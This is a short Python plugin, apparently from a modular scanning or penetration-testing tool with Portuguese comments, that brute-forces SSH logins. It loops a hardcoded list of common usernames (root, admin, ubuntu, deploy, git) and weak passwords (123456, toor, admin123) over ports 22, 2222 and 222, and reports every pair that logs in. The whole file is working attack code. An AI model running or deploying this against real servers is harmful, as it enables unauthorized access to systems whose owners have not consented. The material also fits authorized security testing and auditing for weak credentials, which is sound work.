# plugins/ssh_brute.py

try:
    import paramiko
except ImportError:
    paramiko = None


def run(target, ip, open_ports, banners):
    """
    Tenta brute force SSH em portas padrão e comuns.
    Integrado com open_ports do core.
    Necessita: pip install paramiko
    """
    _ = (ip, banners)

    if paramiko is None:
        return {"plugin": "ssh_brute", "resultados": {"erro": "paramiko não instalado (pip install paramiko)"}}

    ssh_default = [22, 2222, 222]
    portas = sorted(set(ssh_default + [p for p in open_ports if p in ssh_default]))

    usuarios = ["root", "admin", "ubuntu", "user", "deploy", "git"]
    senhas = ["admin", "123456", "password", "toor", "ubuntu", "root", "admin123"]

    encontrados = []
    for porta in portas:
        for user in usuarios:
            for senha in senhas:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        target,
                        port=porta,
                        username=user,
                        password=senha,
                        timeout=5,
                        allow_agent=False,
                        look_for_keys=False,
                    )
                    encontrados.append({"porta": porta, "usuario": user, "senha": senha})
                    client.close()
                except (OSError, paramiko.AuthenticationException, paramiko.ssh_exception.SSHException):
                    continue
                except Exception:
                    continue

    return {
        "plugin": "ssh_brute",
        "resultados": encontrados if encontrados else "Nenhum acesso SSH padrão identificado",
    }
